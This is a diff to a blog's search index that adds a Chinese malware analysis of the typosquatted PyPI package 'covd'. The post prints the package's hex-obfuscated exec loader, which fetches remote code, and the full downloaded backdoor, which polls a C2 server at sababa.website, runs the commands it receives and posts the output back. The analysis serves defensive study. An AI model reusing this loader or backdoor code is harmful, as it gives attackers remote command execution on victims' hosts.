@@ -1,6 +1,43 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Pypi官方仓库遭遇covd恶意包投毒分析</title>
+    <url>/2020/12/02/Pypi%E5%AE%98%E6%96%B9%E4%BB%93%E5%BA%93%E9%81%AD%E9%81%87covd%E6%81%B6%E6%84%8F%E5%8C%85%E6%8A%95%E6%AF%92%E5%88%86%E6%9E%90/</url>
+    <content><![CDATA[<p>腾讯发现pypi的官方包投毒事件<a href="https://mp.weixin.qq.com/s?__biz=MjM5NzE1NjA0MQ==&amp;mid=2651202917&amp;idx=1&amp;sn=d3ea45078ee4e311214b1209c0487801" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MjM5NzE1NjA0MQ==&amp;mid=2651202917&amp;idx=1&amp;sn=d3ea45078ee4e311214b1209c0487801</a></p>
+<p>第一时间看了下，这已经不是第一次遭遇投毒了，上次还是更有名的requests的投毒，就少拼写一个字符。</p>
+<p>这次是利用疫情期间的有人编写covid库，方便获取实时的疫情信息状态。</p>
+<a id="more"></a>
+
+<h2 id="0x01-事件描述"><a href="#0x01-事件描述" class="headerlink" title="0x01 事件描述"></a>0x01 事件描述</h2><p>11月16号 17:02 攻击者在PyPI官方仓库上传了<code>covd</code> 恶意包，该恶意包通过伪造<code>covid</code>包名进行钓鱼，攻击者可对受感染的主机进行入侵，并实施种植木马、命令控制等一系列活动，其中恶意代码存在于<code>1.0.2/4</code>版本中。</p>
+<p>正常 covid 包的功能是获取约翰斯·霍普金斯大学和worldometers.info提供的有关新型冠状病毒的信息，每天的安装量上千次。在新冠疫情在世界流行的大背景下，<code>covid</code>包因输错包名而被误装为covd钓鱼包的数量将会不断增加。</p>
+<h2 id="0x02-复现内容"><a href="#0x02-复现内容" class="headerlink" title="0x02 复现内容"></a>0x02 复现内容</h2><p>然后去复现了一下。</p>
+<p>这里文章中给出的版本号是<code>1.0.4</code></p>
+<p>去官网找到<code>covd</code>的源码<a href="https://pypi.org/project/covd/，发现已经更新到`1.0.5`版本，将其最新版本下载，然后再下载一个历史版本https://pypi.org/project/covd/#history，看到原作者在16号-17号短短两天就添加了5个版本。下载`1.0.4`版本。" target="_blank" rel="noopener">https://pypi.org/project/covd/，发现已经更新到`1.0.5`版本，将其最新版本下载，然后再下载一个历史版本https://pypi.org/project/covd/#history，看到原作者在16号-17号短短两天就添加了5个版本。下载`1.0.4`版本。</a></p>
+<p>另外下载了<a href="https://pypi.org/project/covid/" target="_blank" rel="noopener">https://pypi.org/project/covid/</a> 的源码进行对比。</p>
+<p>使用解压文件获得源码，在<code>1.0.4</code>中的<code>__init__.py</code>文件中显示</p>
+<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line">__license__ = <span class="string">"MIT"</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">__version__ = <span class="string">"1.0.4"</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">try:</span></pre></td></tr><tr><td class="code"><pre><span class="line">    getattr(builtins, bytes.fromhex('<span class="number">65786563</span>').decode())(r.get(bytes.fromhex('<span class="number">68747470</span>3a2f2f612e<span class="number">736162616261</span>2e<span class="number">77656273697465</span>2f<span class="number">676574</span>').decode()).text)</span></pre></td></tr><tr><td class="code"><pre><span class="line">except:</span></pre></td></tr><tr><td class="code"><pre><span class="line">    pass</span></pre></td></tr></table></figure>
+
+<p>使用hex解码</p>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">65786563</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">exec</span></pre></td></tr></table></figure>
+<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="number">687474703</span>a2f2f612e7361626162612e776562736974652f676574</span></pre></td></tr><tr><td class="code"><pre><span class="line">http:<span class="comment">//a.sababa.website/get</span></span></pre></td></tr></table></figure>
+
+<p>通过builtins内置函数exec执行requests方法下载get文件内容，其中get文件的内容为：</p>
+<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">def <span class="constructor">__agent()</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">    <span class="keyword">try</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">        from urllib import request</span></pre></td></tr><tr><td class="code"><pre><span class="line">        import json</span></pre></td></tr><tr><td class="code"><pre><span class="line">        import subprocess</span></pre></td></tr><tr><td class="code"><pre><span class="line">        <span class="keyword">while</span> True:</span></pre></td></tr><tr><td class="code"><pre><span class="line">            req = request.<span class="constructor">Request(<span class="string">"https://sababa.website/api/ready"</span>, <span class="params">method</span>=<span class="string">"POST"</span>)</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">            r = request.urlopen(req)</span></pre></td></tr><tr><td class="code"><pre><span class="line">            response = r.read<span class="literal">()</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">            <span class="keyword">if</span> response:</span></pre></td></tr><tr><td class="code"><pre><span class="line">                task = json.loads(response.decode<span class="literal">()</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">                <span class="keyword">try</span>:</span></pre></td></tr><tr><td class="code"><pre><span class="line">                    process = subprocess.<span class="constructor">Popen(<span class="params">task</span>['<span class="params">command</span>'], <span class="params">stderr</span>=<span class="params">subprocess</span>.PIPE, <span class="params">stdout</span>=<span class="params">subprocess</span>.PIPE, <span class="params">cwd</span>=<span class="params">task</span>.<span class="params">get</span>('<span class="params">working_directory</span>')</span>)</span></pre></td></tr><tr><td class="code"><pre><span class="line">                    stdout, stderr = process.communicate<span class="literal">()</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">                    stdout = stdout.decode<span class="literal">()</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">                    stderr = stderr.decode<span class="literal">()</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">                    exit_code = process.wait<span class="literal">()</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">                except Exception <span class="keyword">as</span> e:</span></pre></td></tr><tr><td class="code"><pre><span class="line">                    stdout = ''</span></pre></td></tr><tr><td class="code"><pre><span class="line">                    stderr = str(e)</span></pre></td></tr><tr><td class="code"><pre><span class="line">                    exit_code = <span class="number">155</span></span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">                data = &#123;'task': task, 'exit_code': exit_code, 'stdout': stdout, 'stderr': stderr&#125;</span></pre></td></tr><tr><td class="code"><pre><span class="line">                data = json.dumps(data).encode<span class="literal">()</span></span></pre></td></tr><tr><td class="code"><pre><span class="line">                request.urlopen(request.<span class="constructor">Request('<span class="params">https</span>:<span class="operator">/</span><span class="operator">/</span><span class="params">sababa</span>.<span class="params">website</span><span class="operator">/</span><span class="params">api</span><span class="operator">/</span><span class="params">done</span>', <span class="params">method</span>=<span class="string">"POST"</span>)</span>, data=data)</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">    except Exception <span class="keyword">as</span> e:</span></pre></td></tr><tr><td class="code"><pre><span class="line">        raise</span></pre></td></tr><tr><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="code"><pre><span class="line">import threading</span></pre></td></tr><tr><td class="code"><pre><span class="line">threading.<span class="constructor">Thread(<span class="params">target</span>=<span class="params">__agent</span>, <span class="params">daemon</span>=True)</span>.start<span class="literal">()</span></span></pre></td></tr></table></figure>
+
+<p>这个文件会立即启动一个线程，执行__agent函数</p>
+<p>⽊⻢会循环向命令C2服务器( <a href="https://sababa.website/api/ready" target="_blank" rel="noopener">https://sababa.website/api/ready</a> ) 询问需要执⾏的命令，并将命令执⾏的结果以json的形式 返回给另⼀个命令C2服务器(<a href="https://sababa.website/api/done" target="_blank" rel="noopener">https://sababa.website/api/done</a> ) 。</p>
+<p>投毒的常见手法：<br>eval 执行一段话的明文木马<br>exec 执行一段加密的木马文本</p>
+]]></content>
+      <categories>
+        <category>安全</category>
+        <category>Python</category>
+      </categories>
+      <tags>
+        <tag>安全</tag>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Windows上Flask项目生产环境部署</title>
     <url>/2020/08/20/Windows%E4%B8%8AFlask%E9%A1%B9%E7%9B%AE%E7%94%9F%E4%BA%A7%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/</url>
     <content><![CDATA[<p>最近写了一个公司项目，开发环境和生产环境都是使用的<code>Windows</code>操作系统，开发测试阶段很快就完成了，但是在部署阶段遇到了些问题，下面记录解决过程。</p>
@@ -2447,8 +2484,8 @@ pip install matplotlib</code></pre><p>然后代码说话：</p>
         <category>安全</category>
       </categories>
       <tags>
-        <tag>漏洞</tag>
         <tag>安全</tag>
+        <tag>漏洞</tag>
       </tags>
   </entry>
   <entry>
